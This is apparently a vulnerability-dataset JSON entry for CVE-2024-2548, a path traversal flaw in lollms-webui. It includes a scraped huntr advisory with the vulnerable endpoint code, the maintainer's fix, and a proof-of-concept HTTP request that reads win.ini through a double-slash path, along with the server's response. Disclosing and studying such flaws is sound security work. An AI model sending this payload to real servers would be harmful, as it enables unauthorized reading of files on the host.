{
    "CVE-2024-2548": {
        "published_date": "2024-06-06T18:08:15.065Z",
        "patch_commits": [
            {
                "url": "https://github.com/parisneo/lollms-webui/commit/49b0332e98d42dd5204dda53dee410b160106265",
                "content": "sync\n\nFilename: zoos/personalities_zoo:\n```\n@@ -1 +1 @@\n-Subproject commit c2320d820cc1d441bfbd88c562a4d61acd2611f2\n+Subproject commit 51065a0ebc6f245c2c38b697390c5b1e7aa82f50\n```"
            }
        ],
        "sw_version": "v9.4",
        "sw_version_wget": "https://github.com/parisneo/lollms-webui/archive/refs/tags/v9.4.zip",
        "description": "A path traversal vulnerability exists in the parisneo/lollms-webui application, specifically within the `lollms_core/lollms/server/endpoints/lollms_binding_files_server.py` and `lollms_core/lollms/security.py` files. Due to inadequate validation of file paths between Windows and Linux environments using `Path(path).is_absolute()`, attackers can exploit this flaw to read any file on the system. This issue affects the latest version of LoLLMs running on the Windows platform. The vulnerability is triggered when an attacker sends a specially crafted request to the `/user_infos/{path:path}` endpoint, allowing the reading of arbitrary files, as demonstrated with the `win.ini` file. The issue has been addressed in version 9.5 of the software.",
        "sec_adv": [
            {
                "url": "https://huntr.com/bounties/65979513-db0d-46fd-9977-fcd73bcd8a41",
                "content": "Bounties\nPartners\nCommunity\nInfo\nSUBMIT REPORT\nPath traversal leads to read any file on the Windows platform system in parisneo/lollms-webui\nValid\nReported on Mar 13th 2024\nDescription\nDue to improper validation between paths on Windows and Linux environments via Path(path).is_absolute(), this allows attackers read any file on the system affects the Windows platform.\nRequirements\nLoLLMs : latest\nPlatform: Windows\nVulnerability code\n#lollms_core\\lollms\\server\\endpoints\\lollms_binding_files_server.py\n...\n@router.get(\"/user_infos/{path:path}\")\nasync def serve_user_infos(path: str):\n    ...\n    sanitize_path_from_endpoint(path)\n\n    file_path = (lollmsElfServer.lollms_paths.personal_user_infos_path / path).resolve()\n    return FileResponse(str(file_path))\n...\n# lollms_core\\lollms\\security.py\n...\ndef sanitize_path_from_endpoint(path: str, error_text=\"A suspected LFI attack detected. The path sent to the server has suspicious elements in it!\", exception_text=\"Invalid path!\"):\n    if path is None:\n        return path\n    \n    # Regular expression to detect patterns like \"....\" and multiple forward slashes\n    suspicious_patterns = re.compile(r'(\\.\\.+)|(/+/)')\n    \n    if suspicious_patterns.search(path) or Path(path).is_absolute():\n        ASCIIColors.error(error_text)\n        raise HTTPException(status_code=400, detail=exception_text)\n    \n    return path\n...\nPoC\nREQUEST:\nGET /user_infos//Windows/win.ini HTTP/1.1\nHost: 127.0.0.1:9600\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36\nRESPONSE:\nHTTP/1.1 200 OK\ndate: Wed, 13 Mar 2024 14:22:38 GMT\nserver: uvicorn\ncontent-type: text/plain; charset=utf-8\ncontent-length: 92\nlast-modified: Sat, 07 Dec 2019 09:12:42 GMT\netag: \"04d8b65948d9cd4859877d2172b4db8d\"\n\n; for 16-bit app support\n[fonts]\n[extensions]\n[mci extensions]\n[files]\n[Mail]\nMAPI=1\nImpact\nRead any file on the Windows system\nWe are processing your report and will contact theparisneo/lollms-webui team within 24 hours.a year ago\nNhien.IT modified the reporta year ago\nhuntr-helpermodified the Severity from Critical (9.1) to High (7.5)a year ago\nWe have contacted a member of theparisneo/lollms-webui team and are waiting to hear backa year ago\nThe researcher has received a minor penalty to their credibility for miscalculating the severity: -1\nSaifeddine ALOUI validated this vulnerabilitya year ago\nOK, this is legit. I have changed the code to sanitize from any / or any amount of slashes /////// at the beginning of the sent path.\nThanks.\n@router.get(\"/user_infos/{path:path}\")\nasync def serve_user_infos(path: str):\n    \"\"\"\n    Serve user information file.\n\n    Args:\n        path (FilePath): The validated path to the file to be served.\n\n    Returns:\n        FileResponse: The file response containing the requested file.\n    \"\"\" \n    path = sanitize_path_from_endpoint(path)\n\n    file_path:Path = lollmsElfServer.lollms_paths.personal_user_infos_path / path\n    if not file_path.exists():\n        raise HTTPException(status_code=400, detail=\"File not found\")\n    return FileResponse(str(file_path))\nand in security:\ndef sanitize_path_from_endpoint(path: str, error_text=\"A suspected LFI attack detected. The path sent to the server has suspicious elements in it!\", exception_text=\"Invalid path!\"):\n    # Fix the case of \"/\" at the beginning on the path\n    path = path.lstrip('/')\n    if path is None:\n        return path\n    \n    # Regular expression to detect patterns like \"....\" and multiple forward slashes\n    suspicious_patterns = re.compile(r'(\\.\\.+)|(/+/)')\n    \n    if suspicious_patterns.search(path) or Path(path).is_absolute():\n        ASCIIColors.error(error_text)\n        raise HTTPException(status_code=400, detail=exception_text)\n    \n    return path\ncan you please confirm that the fix works and no other tricks can overcome the fix?\nnhienit2010has been awarded the disclosure bounty\nThe fix bounty is now up for grabs\nThe researcher's credibility has increased: +7\nCVE-2024-2548assigned to this report.a year ago\nNhien.IT\ncommenteda year ago\nResearcher\nThanks @maintainer ! It looks better now\nSaifeddine ALOUImarked this as fixedin 9.5with commit49b033a year ago\nThe fix bounty has been dropped\nWe have sent a warning to the parisneo/lollms-webui team to inform them that this report will be published in 48 hoursa year ago\nThis vulnerability has now been publisheda year ago\nCVE-2024-2548has now been publisheda year ago\nSign in to join this conversation\nCVE\nCVE-2024-2548\n(Published)\nVulnerability Type\nCWE-36: Absolute Path Traversal\nSeverity\nHigh (7.5)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator\nRegistry\nOther\nAffected Version\nlatest\nVisibility\nPublic\nStatus\nFixed\nDisclosure Bounty\n$450\nFix Bounty\n$112.5\nFound by\nSupported by Protect AI and leading the way to MLSecOps and greater AI security.\nÂ© 2024\nPrivacy Policy\nTerms of Service\nCode of Conduct\nCookie Preferences\nContact Us",
                "effective": true,
                "effective_reason": "The advisory includes a request and response demonstrating the vulnerability."
            }
        ],
        "cwe": [
            {
                "id": "CWE-36",
                "value": "CWE-36 Absolute Path Traversal"
            }
        ]
    }
}